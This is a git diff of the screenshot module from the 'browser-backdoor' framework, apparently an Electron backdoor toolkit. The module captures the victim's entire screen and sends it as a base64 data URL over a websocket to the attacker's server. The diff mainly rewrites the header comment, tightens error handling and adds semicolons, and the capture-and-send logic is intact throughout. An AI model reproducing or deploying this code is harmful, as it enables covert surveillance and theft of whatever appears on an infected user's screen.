@@ -1,12 +1,10 @@
-/*
- * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Takes a screenshot of the main screen.
- * Parameters: None
- * Returns: undefined, Data URL of screenshot
- * Author: IMcPwn
+/**
+ * @file screenshot Module
+ * @summary Takes a screenshot of the client system's main screen.
+ * @author IMcPwn 
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron');
@@ -21,19 +19,25 @@ path = require('path');
 thumbSize = determineScreenShotSize();
 options = { types: ['screen'], thumbnailSize: thumbSize };
 
-desktopCapturer.getSources(options, function (error, sources) {
-    if (error) ws.send(error)
+/**
+ * @return {String} "Screenshot data URL: " + Base64 encoded screenshot
+ */
+desktopCapturer.getSources(options, function (err, sources) {
+    if (err) {
+        ws.send("Error: " + err.toString());
+        return;
+    }
 
     sources.forEach(function (source) {
         if (source.name === 'Entire screen' || source.name === 'Screen 1') {
-            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL())
+            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL());
         }
     })
 })
 
 function determineScreenShotSize() {
-  screenSize = electronScreen.getPrimaryDisplay().workAreaSize
-  maxDimension = Math.max(screenSize.width, screenSize.height)
+  screenSize = electronScreen.getPrimaryDisplay().workAreaSize;
+  maxDimension = Math.max(screenSize.width, screenSize.height);
   return {
     width: maxDimension * window.devicePixelRatio,
     height: maxDimension * window.devicePixelRatio
